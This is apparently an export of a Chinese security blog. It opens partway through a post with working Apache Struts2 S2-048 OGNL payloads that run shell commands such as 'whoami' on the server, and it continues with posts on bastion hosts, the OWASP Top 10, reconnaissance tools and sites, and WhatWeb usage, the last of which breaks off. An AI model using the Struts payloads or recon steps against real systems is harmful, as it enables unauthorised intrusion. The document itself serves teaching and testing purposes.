<p>${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef=’echo s2-048-EXISTS’).(#iswin=(@\u006Aava.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#efe=(#iswin?{‘cmd.exe’,’/c’,#ef}:{‘/bin/bash’,’-c’,#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}”, ‘age’:’bbb’, ‘__checkbox_bustedBefore’:’true’, ‘description’:’ccc’</p>
</blockquote>
<p>视频里的payload为</p>
<blockquote>
<p>%{(#_=’multipart/form-data’).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=’whoami’).(#iswin=(@java.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{‘/bin/bash’,’-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</p>
</blockquote>
<p>即</p>
<p><img src="/image/strus/15.jpg"></p>
<h3 id="七、执行结果"><a href="#七、执行结果" class="headerlink" title="七、执行结果"></a>七、执行结果</h3><p><img src="/image/strus/14.jpg"></p>
<p>(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>堡垒机</title>
    <url>/2018/06/10/%E5%A0%A1%E5%9E%92%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="🎃堡垒机原理"><a href="#🎃堡垒机原理" class="headerlink" title="🎃堡垒机原理"></a>🎃堡垒机原理</h1><p>其从功能上讲，它综合了核心系统运维和安全审计管控两大主干功能，从技术实现上讲，通过切断终端计算机对网络和服务器资源的直接访问，而采用协议代理的方式，接管了终端计算机对网络和服务器的访问。形象地说，终端计算机对目标的访问，均需要经过运维安全审计的翻译。打一个比方，运维安全审计扮演着看门者的工作，所有对网络设备和服务器的请求都要从这扇大门经过。因此运维安全审计能够拦截非法访问和恶意攻击，对不合法命令进行命令阻断，过滤掉所有对目标设备的非法访问行为，并对内部人员误操作和非法操作进行审计监控，以便事后责任追踪。安全审计作为企业信息安全建设不可缺少的组成部分，逐渐受到用户的关注，是企业安全体系中的重要环节。同时，安全审计是事前预防、事中预警的有效风险控制手段，也是事后追溯的可靠证据来源。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><hr>
<h1 id="🎊🎃产生原因"><a href="#🎊🎃产生原因" class="headerlink" title="🎊🎃产生原因"></a>🎊🎃产生原因</h1><p>编辑随着企事业单位IT系统的不断发展，网络规模和设备数量迅速扩大，日趋复杂的IT系统与不同背景的运维人员的行为给信息系统安全带来较大风险。1.多个用户使用同一个账号。这种情况主要出现在同一工作组中，由于工作需要，同时系统管理账号，因此只能多用户共享同一账号。如果发生安全事故，不仅难以定位账号的实际使用者和责任人，而且无法对账号的使用范围进行有效控制，存在较大安全风险和隐患。2.一个用户使用多个账号。一个维护人员使用多个账号是较为普遍的情况，用户需要记忆多套口令同时在多套主机系统、网络设备之间切换，降低工作效率，增加工作复杂度。如下图所示：3. 缺少统一的权限管理平台，权限管理日趋繁重和无序；而且维护人员的权限大多是粗放管理，无法基于最小权限分配原则的用户权限管理，难以实现更细粒度的命令级权限控制，系统安全性无法充分保证。4. 无法制定统一的访问审计策略，审计粒度粗。各网络设备、主机系统、数据库是分别单独审计记录访问行为，由于没有统一审计策略，并且各系统自身审计日志内容深浅不一，难以及时通过系统自身审计发现违规操作行为和追查取证。5. 传统的网络安全审计系统无法对维护人员经常使用的SSH、RDP等加密、图形操作协议进行内容审计。</p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-972dcd3ea540be9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/777/format/webp" alt="img"></p>
<hr>
<h1 id="🎃🎃核心功能"><a href="#🎃🎃核心功能" class="headerlink" title="🎃🎃核心功能"></a>🎃🎃核心功能</h1><p><strong>登录功能</strong></p>
<p>支持对X11、linux、unix、数据库、网络设备、安全设备等一系列授权账号进行密码的自动化周期更改，简化密码管理，让使用者无需记忆众多系统密码，即可实现自动登录目标设备，便捷安全。</p>
<p><strong>账号管理</strong></p>
<p>设备支持统一账户管理策略，能够实现对所有服务器、网络设备、安全设备等账号进行集中管理，完成对账号整个生命周期的监控，并且可以对设备进行特殊角色设置如：审计巡检员、运维操作员、设备管理员等自定义设置，以满足审计需求</p>
<p><strong>身份认证</strong></p>
<p>设备提供统一的认证接口，对用户进行认证，支持身份认证模式包括 动态口令、静态密码、硬件key 、生物特征等多种认证方式，设备具有灵活的定制接口，可以与其他第三方认证服务器之间结合；安全的认证模式，有效提高了认证的安全性和可靠性。</p>
<p><strong>资源授权</strong></p>
<p>设备提供基于用户、目标设备、时间、协议类型IP、行为等要素实现细粒度的操作授权，最大限度保护用户资源的安全</p>
<p><strong>访问控制</strong></p>
<p>设备支持对不同用户进行不同策略的制定，细粒度的访问控制能够最大限度的保护用户资源的安全，严防非法、越权访问事件的发生。</p>
<p><strong>操作审计</strong></p>
<p>设备能够对字符串、图形、文件传输、数据库等全程操作行为审计；通过设备录像方式实时监控运维人员对操作系统、安全设备、网络设备、数据库等进行的各种操作，对违规行为进行事中控制。对终端指令信息能够进行精确搜索，进行录像精确定位。 </p>
<p><img src="//upload-images.jianshu.io/upload_images/21549033-fc37fed2e7e53c29.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/527/format/webp" alt="img"></p>
<hr>
<h1 id="🎃目标价值"><a href="#🎃目标价值" class="headerlink" title="🎃目标价值"></a>🎃目标价值</h1><p><strong>1、 目标</strong></p>
<blockquote>
<p>堡垒机的核心思路是<a href="https://links.jianshu.com/go?to=https://baike.baidu.com/item/%25E9%2580%25BB%25E8%25BE%2591/543">逻辑</a>上将人与目标设备分离，建立“人-〉主账号（堡垒机用户账号）-〉授权—&gt;从账号（目标设备账号）的模式;在这种模式下，基于身份标识，通过集中管控安全策略的账号管理、授权管理和审计，建立针对维护人员的“主账号-〉登录—〉访问操作-〉退出”的全过程完整审计管理，实现对各种运维加密/非加密、图形操作协议的命令级审计。</p>
</blockquote>
<p><strong>2、 系统价值</strong></p>
<p>堡垒机的作用主要体现在下述几个方面：</p>
<blockquote>
<p><strong>企业角度</strong></p>
<p>通过<a href="https://links.jianshu.com/go?to=https://baike.baidu.com/item/%25E7%25BB%2586%25E7%25B2%2592%25E5%25BA%25A6">细粒度</a>的安全管控策略，保证企业的服务器、网络设备、数据库、安全设备等安全可靠运行，降低人为安全风险，避免安全损失，保障企业效益。</p>
</blockquote>
<blockquote>
<p><strong>管理员角度</strong></p>
<p>所有运维账号的管理在一个平台上进行管理，账号管理更加简单有序；</p>
<p>通过建立用户与账号的对应关系，确保用户拥有的权限是完成任务所需的最小权限；</p>
<p>直观方便的监控各种访问行为，能够及时发现违规操作、权限滥用等。</p>
<p>鉴于多账号同时使用超管进行的操作，便于实名制的认证和自然人的关联。</p>
</blockquote>
<blockquote>
<p><strong>普通用户角度</strong></p>
<p>运维人员只需记忆一个账号和口令，一次登录，便可实现对其所维护的多台设备的访问，无须记忆多个账号和口令，提高了工作效率，降低工作复杂度。</p>
</blockquote>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><hr>
<h1 id="🎃应用"><a href="#🎃应用" class="headerlink" title="🎃应用"></a>🎃应用</h1><blockquote>
<p>一种用于单点登录的主机应用系统，<a href="https://links.jianshu.com/go?to=https://baike.baidu.com/item/%25E7%2594%25B5%25E4%25BF%25A1/15421798">电信</a>、<a href="https://links.jianshu.com/go?to=https://baike.baidu.com/item/%25E7%25A7%25BB%25E5%258A%25A8/8464874">移动</a>、<a href="https://links.jianshu.com/go?to=https://baike.baidu.com/item/%25E8%2581%2594%25E9%2580%259A">联通</a>三个运营商广泛采用堡垒机来完成单点登陆和萨班斯要求的审计。</p>
<p>在银行、证券等金融业机构也广泛采用堡垒机来完成对财务、会计操作的审计。</p>
<p>在电力行业的双网改造项目后，采用堡垒机来完成双网隔离之后跨网访问的问题，能够很好的解决双网之间的访问的安全问题。</p>
</blockquote>
<h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><hr>
<h1 id="🧧特点"><a href="#🧧特点" class="headerlink" title="🧧特点"></a>🧧特点</h1><p><strong>审计协议范围</strong></p>
<p>平台采用协议分析、基于数据包还原虚拟化技术，实现操作界面模拟，将所有的操作转换为图形化界面予以展现，实现100%审计信息不丢失：针对运维操作图形化审计功能的展现外，同时还能对字符进行分析，包括命令行操作的命令以及回显信息和非字符型操作时键盘、鼠标的敲击信息。</p>
<p><strong>系统支持的审计协议以及工具包括：</strong></p>
<blockquote>
<p>字符串操作：SSH/Telnet（工具：SecureCRT/Putty/Xshell）</p>
<p>图形操作： RDP/VNC/X11/pcAnywhere/DameWare等</p>
<p>其他协议： FTP/SFTP/Http/Https等</p>
<p>数据库工具:Oracle/sqlserver/Mysql客户端工具</p>
<p>协议及工具</p>
<p>字符串操作：SSH/Telnet （工具：SecureCRT/Putty/Xshell）</p>
<p>图形操作： RDP/VNC/X11/pcAnywhere/DameWare等</p>
<p>其他协议：FTP/SFTP/Http/Https/SQLPLUS等</p>
</blockquote>
<p><strong>报表管理</strong></p>
<p>平台具有丰富的报表统计功能，可以进行默认报表和自定义报表来进行运维数据的报表统计。</p>
<p>平台提供多种报表格式，包括Word、Excel等。</p>
<p>平台提供折线、饼状、柱状等多种图表统计运维数据，方便后期的运维分析和管理。</p>
<p><strong>完善管理权限</strong></p>
<p>平台对用户的管理权限严格分明，各司其职，分为系统管理员、审计管理员、运维管理员、口令管理员四种管理员角色，平台也支持管理员角色的自定义创建，对管理权限进行细粒度设置，保障了平台的用户安全管理，以满足审计需求</p>
<p>平台集用户管理、身份认证、资源授权、访问控制、操作审计为一体，有效地实现了事前预防、事中控制和事后审计。</p>
<p><strong>处理能力</strong></p>
<p>审计平台能够对常见的SSH/Telnet/FTP/SFTP/HTTP/HTTPS /Windows Terminal/X11、VNC协议进行完整的透明转发，针对如RDP/VNC/X11等图形化协议的处理能力要比同类产品处理能力强。</p>
<p><strong>性能</strong></p>
<p>平台采用模块化设计，单模块故障不影响其他模块使用，从而提高了平台的健壮性、稳定性</p>
<p>运维人员登陆可支持Portal统一登录，并兼容终端C/S客户端连接设备；</p>
<p>审计平台的认证方式可以与第三方的认证设备进行定制兼容</p>
<p>具有强大研发实力，不但能为客户提供长期的产品更新，还能按照客户的实际需求进行定制开发。</p>
<p><strong>部署方式</strong></p>
<p>堡垒机提供了功能完善、操作灵活、使用方便、界面友好、符合习惯的审计管理功能；</p>
<p>B/S方式实现了对后台的各项管理配置</p>
<p>平台简单易部署，通过配置导航，可在短时间内完成配置要求，实现上线要求。</p>
<p><strong>系统安全</strong></p>
<p>基于HTTPS/SSL的自身安全管理与审计；</p>
<p>严格的安全访问控制和管理员身份认证支持强认证；</p>
<p>审计信息加密存储；</p>
<p>完善的审计信息备份机制；</p>
<p>完整全面的自审计功能。</p>
<h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><hr>
<h1 id="🎇堡垒机注意事项"><a href="#🎇堡垒机注意事项" class="headerlink" title="🎇堡垒机注意事项"></a>🎇堡垒机注意事项</h1><h1 id="原则1：堡垒机的账号管理"><a href="#原则1：堡垒机的账号管理" class="headerlink" title="原则1：堡垒机的账号管理"></a>原则1：堡垒机的账号管理</h1><p>企业管理人员为了方便登陆，经常会出现多个用户使用一个账号或一个用户使用多个账号的情况。由于共享账号是多人共同使用，当系统发生问题后，无法精确定位恶意操作或误操作的具体责任人。因此在搭建堡垒机时，一定要注意必须做到一人一个帐号，绝不允许多个人共用个人帐号，更不能允许共同账号登录堡垒机。</p>
<h1 id="原则2：堡垒机的访问控制"><a href="#原则2：堡垒机的访问控制" class="headerlink" title="原则2：堡垒机的访问控制"></a>原则2：堡垒机的访问控制</h1><p>访问控制的目的是通过限制维护人员对数据信息的访问能力及范围，保证信息资源不被非法使用和访问。</p>
<h1 id="原则3：堡垒机的指令审核"><a href="#原则3：堡垒机的指令审核" class="headerlink" title="原则3：堡垒机的指令审核"></a>原则3：堡垒机的指令审核</h1><p>堡垒机的操作审计功能主要审计运维人员的账号使用（登录、资源访问）情况、资源使用情况等，针对敏感指令，堡垒机可以进行阻断响应或触发审核操作，审核不通过的敏感指令，堡垒机将会进行拦截。</p>
<h1 id="原则4：堡垒机的身份认证"><a href="#原则4：堡垒机的身份认证" class="headerlink" title="原则4：堡垒机的身份认证"></a>原则4：堡垒机的身份认证</h1><p>杜绝仅使用密码登录堡垒机，建议在执行主机重启、密码修改、会话创建、快照回滚、磁盘更换等各种重要操作时，可通过微信或短信等进行双因子身份确认，确保访问者身份的合法性。</p>
<h1 id="原则5：堡垒机的资源授权"><a href="#原则5：堡垒机的资源授权" class="headerlink" title="原则5：堡垒机的资源授权"></a>原则5：堡垒机的资源授权</h1><p>用户授权，建议结合公司内部CMDB来做基于角色的访问控制模型以实现权限控制。通过集中访问控制和细粒度的命令级授权策略，基于最小权限原则，实现集中有序的运维操作管理。</p>
<h1 id="原则6：堡垒机的审计录像"><a href="#原则6：堡垒机的审计录像" class="headerlink" title="原则6：堡垒机的审计录像"></a>原则6：堡垒机的审计录像</h1><p>在安全层面，除了通过堡垒机的事前权限授权、事中敏感指令拦截外，还需提供堡垒机事后运维审计的特性。用户在堡垒机中所进行的运维操作均会以日志的形式记录下来，管理者即通过日志对运维人员的运维操作进行审计。</p>
<h1 id="原则7：堡垒机的操作审计"><a href="#原则7：堡垒机的操作审计" class="headerlink" title="原则7：堡垒机的操作审计"></a>原则7：堡垒机的操作审计</h1><p>堡垒机的操作审计功能主要审计运维人员的账号使用（登录、资源访问）情况、资源使用情况等。在各服务器主机的访问日志记录都采用统一的账号、资源进行标识后，堡垒机的操作审计功能才能更好地对账号的完整使用过程进行追踪。</p>
<p>以上是企业搭建堡垒机时应该注意的7个原则，只有坚持并遵守7个原则搭建堡垒机，企业的数据安全才能够尽可能的得到保证。对于创业公司或者中小企业来讲，成本是不得不考虑的大问题，放眼看市面上堡垒机的众多品牌，目前主流堡垒机分为开源堡垒机和商用堡垒机两大类。企业选择合适的堡垒机搭建时，需要结合自身的成本预估和产品的性能特点。开源堡垒机使用灵活方便，但是后期的运维成本颇高，需要请专人进行运维或者找原厂商进行二次开发，总体下来其成本不亚于直接购买一台商用堡垒机，并且开源堡垒机原厂商没有任何责任。</p>
<p>商用堡垒机分为三种，这里就不细说了，推荐大家使用云堡垒机，免安装免维护，行云管家云堡垒机是市面上首款也是唯一一款支持Windows2012/2016系统操作指令审计的<strong>堡垒机</strong>，并且除了私有部署版堡垒机，行云管家还提供更加便宜且功能一样的SaaS形态堡垒机，为用户提供4台云主机或局域网主机的免费管理配额。通常来讲，4台主机免费配额已经能够满足创业公司或中小型企业的基本需要。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp-top10</title>
    <url>/2019/03/20/owasp-top10/</url>
    <content><![CDATA[<h2 id="什么是OWASP-Top-10"><a href="#什么是OWASP-Top-10" class="headerlink" title="什么是OWASP Top 10"></a>什么是OWASP Top 10</h2><p>OWASP（开放式Web应用程序安全项目）的工具、文档、论坛和全球各地分会都是开放的，对所有致力于改进应用程序安全的人士开放，其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结了Web应用程序最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p>
<h2 id="A1-注入injection"><a href="#A1-注入injection" class="headerlink" title="A1 注入injection"></a>A1 注入injection</h2><p>将不安全的命令作为命令发送给解析器，会产生类似于SQL注入、NoSQL注入、OS注入和LDAP注入(轻量目录访问协议) 的缺陷，攻击者可以构造恶意数据通过注入缺陷的解析器执行没有权限的非预期命令或访问数据。</p>
<h2 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h2><p>通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者暂时或永久的冒充其他用户的身份。</p>
<h2 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h2><p>这个比较好理解，一般我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p>
<h2 id="A4外部实体-XXE"><a href="#A4外部实体-XXE" class="headerlink" title="A4外部实体(XXE)"></a>A4外部实体(XXE)</h2><p>XXE 全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(统一资源标识符)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
<h2 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h2><p>通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，eg:访问用户的账户、敏感文件、获取和正常用户相同的权限等.</p>
<h2 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h2><p>安全配置错误是比较常见的漏洞，由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p>
<h2 id="A7-跨站脚本（xss）"><a href="#A7-跨站脚本（xss）" class="headerlink" title="A7 跨站脚本（xss）"></a>A7 跨站脚本（xss）</h2><p>xss攻击全称为跨站脚本攻击,当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新的现有网页时，就会出现xss漏洞，跨站脚本攻击是最普遍的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</p>
<h2 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h2><p>不安全的反序列化可以导致远程代码执行、重放攻击、注入攻击或特权升级攻击</p>
<h2 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h2><p>组件(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</p>
<h2 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h2><p>这个和等保有一定的关系，不作介绍，不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</p>
<p>结语</p>
<p>大概了解了top 10的相关漏洞，对于漏洞有了一个大概的认识，接下来就是去多实际操作，去熟悉漏洞的相关特性，有助于您更好的了解这些漏洞。</p>
<p>参考文章</p>
<p>OWASP Top 10 2017:<a href="https://links.jianshu.com/go?to=https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%2528en%2529.pdf.pdf">https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf</a></p>
<p>三分钟了解OWASP TOP 10 2017 RC2: <a href="https://links.jianshu.com/go?to=https://www.freebuf.com/news/152207.html">https://www.freebuf.com/news/152207.html</a></p>
<p>浅谈OWASP TOP 10:<a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/cn-36/p/6723536.html">https://www.cnblogs.com/cn-36/p/6723536.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>信息收集所需工具及网站</title>
    <url>/2019/10/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%E5%8F%8A%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<p>一、扫描域名漏洞：</p>
<p>域名漏洞扫描工具有AWVS、APPSCAN、Netspark、WebInspect、Nmap、Nessus、天镜、明鉴、WVSS、RSAS等。</p>
<p>二、子域名探测：</p>
<p>1、dns域传送漏洞</p>
<p>2、搜索引擎查找（通过Google、bing、搜索c段）</p>
<p>3、通过ssl证书查询网站：<a href="https://links.jianshu.com/go?to=https://myssl.com/ssl.html">https://myssl.com/ssl.html</a>  和<a href="https://links.jianshu.com/go?to=https://www.chinassl.net/ssltools/ssl-checker.html">https://www.chinassl.net/ssltools/ssl-checker.html</a></p>
<p>4、备案号查询：，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。</p>
<p><strong>网站备案查询地址：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></strong> <strong>或</strong><a href="https://links.jianshu.com/go?to=http://icp.bugscaner.com/">http://icp.bugscaner.com/</a></p>
<p>5、使用工具扫描暴力破解：<strong>使用**</strong>k8**<strong>工具</strong></p>
<p><strong>6**</strong>、字典枚举法：**字典枚举法是一种传统查找子域名的技术，这类工具有  DNSReconcile、Layer子域名挖掘机、DirBuster等。</p>
<p><strong>7**</strong>、**<strong>公开DNS源</strong></p>
<p>Rapid7下Sonar项目发布的：<a href="https://scans.io/study/sonar.fdns_v2%E3%80%82">https://scans.io/study/sonar.fdns_v2。</a></p>
<p>DNS历史解析：     <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p><strong>8**</strong>、网站收集：**</p>
<p><a href="https://links.jianshu.com/go?to=https://ti.360.cn/%23/homepage">https://ti.360.cn/#/homepage</a></p>
<p><a href="https://links.jianshu.com/go?to=https://site.ip138.com/">https://site.ip138.com</a></p>
<p><a href="https://links.jianshu.com/go?to=https://isecurity.huawei.com.%25E3%2580%2581/">https://isecurity.huawei.com。、</a></p>
<p>9、jsfinder获取二级域名信息</p>
<p>三、敏感信息收集</p>
<p>1、查目标网站真实IP，有的网站有CDN，无法知道真实IP，所以，利用多ping去判断分析真实IP。</p>
<p>2、知道真实IP，就可以端口扫描，看一些敏感端口。要么端口爆破，要么嗅探。进行IP地址端口扫描，对响应的端口进行漏洞探测，比如rsync,心脏出血，mysql,ftp,ssh弱口令等。</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</p>
<p>google hack 进一步探测网站的信息，后台，敏感文件</p>
<p>3、通过<strong>Web**</strong>源代码泄露获取敏感信息**</p>
<p>4、通过<strong>社工库信息泄露获取敏感信息</strong></p>
<p><strong>5**</strong>、邮箱信息收集**</p>
<p><strong>6**</strong>、历史漏洞收集通过一些网站；例如历史漏洞库：**<strong><a href="http://www.anquan.us/">http://www.anquan.us/</a></strong></p>
<p>漏洞银行：<a href="https://links.jianshu.com/go?to=https://www.bugbank.cn/">https://www.bugbank.cn/</a></p>
<p>360补天：<a href="https://links.jianshu.com/go?to=https://www.butian.net/">https://www.butian.net/</a></p>
<p>教育行业漏洞报告平台（Beta）<a href="https://links.jianshu.com/go?to=https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p>
<p>指纹识别、waf、cdn识别</p>
<p>指纹识别：</p>
<p>工具识别：御剑WEB指纹识别系统、whatweb、Wapplyzer插件等工具。</p>
<p>在线识纹识别：</p>
<p><a href="https://links.jianshu.com/go?to=http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p><a href="https://links.jianshu.com/go?to=http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a> </p>
<p>Waf识别：下载后安装python setup.py install</p>
<p>Cdn识别网站<a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.pyji">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.pyji</a></p>
<p>四、信息整理梳理资产</p>
<p>有了庞大的域名，接下来就是帮助SRC梳理资产了。域名可以先判断存活，活着的继续进行确定IP环节。根据IP的分布，确定企业的公网网段</p>
<p><strong>通过以下网站</strong></p>
<p><strong>SRC**</strong>众测平台**</p>
<p>国际漏洞提交平台 <a href="https://www.hackerone.com/">https://www.hackerone.com/</a></p>
<p>BugX区块链漏洞平台<a href="http://www.bugx.org/">http://www.bugx.org/</a></p>
<p>Gsrc瓜子src</p>
<p><a href="https://security.guazi.com/">https://security.guazi.com/</a></p>
<p>区块链安全响应中心 <a href="https://dvpnet.io/">https://dvpnet.io/</a></p>
<p>CNVD国家信息安全漏洞平台<a href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a></p>
<p>漏洞银行：<a href="https://links.jianshu.com/go?to=https://www.bugbank.cn/">https://www.bugbank.cn/</a></p>
<p>360补天：<a href="https://links.jianshu.com/go?to=https://www.butian.net/">https://www.butian.net/</a></p>
<p>教育行业漏洞报告平台（Beta）<a href="https://links.jianshu.com/go?to=https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p>
<p><strong>国内平台</strong></p>
<p>知道创宇Seebug漏洞平台 <a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
<p>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>WhatWeb使用</title>
    <url>/2020/09/10/WhatWeb%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WhatWeb是一个开源的网站指纹识别软件。</p>
<p>WhatWeb可识别Web技术，包括内容管理系统（CMS），博客平台，统计/分析包，Javascript库，服务器和嵌入式设备。</p>
<p>WhatWeb有超过1000个插件，每个插件都能识别不同的东西。WhatWeb还标识版本号，电子邮件地址，账户ID，Web框架模块，SQL错误等。</p>
<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>拥有超过1700+个插件</p>
<p>​    若网站返回302，会跳转到重定向的网站</p>
<p>​    可以根据服务器返回的响应头确定网站使用的服务器类型，web中间件类型，cookie信息</p>
<p>​    可以从网站的源代码中确定网站使用了哪些JavaScript库</p>
<p>​    可以通过页面hash，path等确定网站使用的cms版本</p>
<p>​    查询网站ip及所属国家</p>
<p>​    多种日志格式：XML，JSON，MagicTree，RubyObject，MongoDB</p>
<p>​    可定制化HTTP头</p>
<p>​    可进行基础的认证设置</p>
<p>​    支持批量扫描网站</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Whatweb是基于ruby语言开发，因此可以安装在具备ruby环境的系统中，目前支持Windows/Max OSX/Linux。</p>
<p>注：kali linux下已经集成了此工具</p>
<p>debian/ubtuntu系统下</p>
<p>apt-get install whatweb  //可自动解决以来问题</p>
<p>redhat/centos系统下</p>
<p>yum updateyum install ruby ruby-devel rubygemswget <a href="http://www.morningstarsecurity.com/downloads/whatweb-0.4.7.tar.gztar">http://www.morningstarsecurity.com/downloads/whatweb-0.4.7.tar.gztar</a> xzvf whatweb-0.4.7.tar.gzcd whatweb-0.4.7./whatweb url</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>用法：whatweb 域名</p>
<p>-i 指定要扫描的文件</p>
<p>-v 详细显示扫描的结果</p>
<p>-a 指定运行级别</p>
<p><strong>常规扫描</strong></p>
<p>whatweb 域名</p>
<p><strong>批量扫描</strong></p>
<p>我们可以通过将很多要扫描的域名放在文件内，然后扫描时指定该文件即可。</p>
<p>使用命令：whatweb -i /root/target.txt</p>
<p><strong>详细回显扫描</strong></p>
<p>whatweb -v 域名</p>
<p><strong>强度扫描等级控制</strong></p>
<p>whatweb有一个-aggression（简写为-a）参数，此参数后边可以跟数字1-4，分别对应4个不同的等级。</p>
<p>stealthy 每个目标发送一次http请求，并且会跟随重定向</p>
<p>​    unused 不可用（从2011年开始，此参数就是在开发状态</p>
<p>​    aggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果确定的</p>
<p>​    heavy 每个目标会发送大量的http请求，会去尝试每一个插件</p>
<p>whatweb -a 等级 域名 （可以和-v参数结合使用</p>
<p>注：默认参数为1</p>
<p><strong>快速本地扫描（扫描内网主机）</strong></p>
<p>whatweb –no-errors -t 255 内网网段 （可以和-a和-v参数结合使用</p>
<p><strong>将扫描结果导出至文件内</strong></p>
